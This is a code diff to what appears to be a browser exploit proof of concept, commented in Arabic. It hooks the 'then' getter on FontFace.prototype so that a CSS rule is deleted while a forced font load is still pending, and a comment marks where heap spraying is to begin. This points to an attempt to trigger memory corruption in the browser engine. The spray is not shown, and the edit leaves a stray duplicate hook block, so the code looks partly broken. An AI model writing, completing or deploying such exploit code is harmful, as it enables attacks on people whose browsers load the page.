@@ -19,15 +19,28 @@
         };
 
         window.onload = () => {
-            // استبدل جزء التحميل في الكود بهذا الجزء:
-log("[+] FORCING_FONT_LOAD_PENDING...");
-// نغير الاسم لخط غير موجود إطلاقاً لإجبار المحرك على محاولة تحميله عبر الـ Network
-let A = new FontFace('nonExistentFont_999', 'url(https://invalid-url.local)', { unicodeRange: 'U+0041' });
-document.fonts.add(A);
-// لا تستخدم A.loaded هنا، دعنا نترك المحرك يعلق في حالة الـ Loading
-document.fonts.load('1em nonExistentFont_999', 'AB');
+    // 1. تثبيت الـ Hook أولاً (يجب أن يكون قبل أي محاولة تحميل)
+    let A = new FontFace('nonExistentFont_999', 'url(https://invalid-url.local)', { unicodeRange: 'U+0041' });
+    
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get() {
+            if (this === A) {
+                log("[!] HOOK_TRIGGERED: FontFace Promise Resolution intercepted...");
+                document.getElementById('s').sheet.deleteRule(0);
+                // هنا يبدأ الـ Spraying
+                return undefined;
+            }
+            return undefined;
+        }
+    });
 
-            
+    document.fonts.add(A);
+    log("[+] FORCING_FONT_LOAD_PENDING...");
+    document.fonts.load('1em nonExistentFont_999', 'AB');
+};
+
+
             Object.defineProperty(FontFace.prototype, 'then', {
                 configurable: true,
                 get() {
